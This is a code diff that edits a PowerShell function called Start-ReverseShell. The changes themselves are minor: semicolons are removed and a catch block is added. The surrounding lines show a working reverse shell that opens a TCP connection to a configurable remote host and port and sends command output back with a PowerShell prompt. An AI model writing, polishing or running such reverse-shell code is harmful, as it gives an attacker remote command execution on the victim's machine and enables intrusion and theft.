@@ -6,7 +6,6 @@ Function Start-ReverseShell {
         [string]$IPAddr = "127.0.0.1" ,
         [string]$Port = "8080"
     )
-    
     try {
         # Create a TCP client and connect to the remote host
         $client = New-Object System.Net.Sockets.TCPClient($IPAddr, $Port)
@@ -29,11 +28,14 @@ Function Start-ReverseShell {
                 $sendback = $_.Exception.Message;
             }
 
-            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>';
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-            $stream.Write($sendbyte, 0, $sendbyte.Length);
-            $stream.Flush();
+            $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '>'
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte, 0, $sendbyte.Length)
+            $stream.Flush()
         }
+    }
+    catch {
+        Write-Host "Error: $_"
     }
     finally {
         # Close the connection
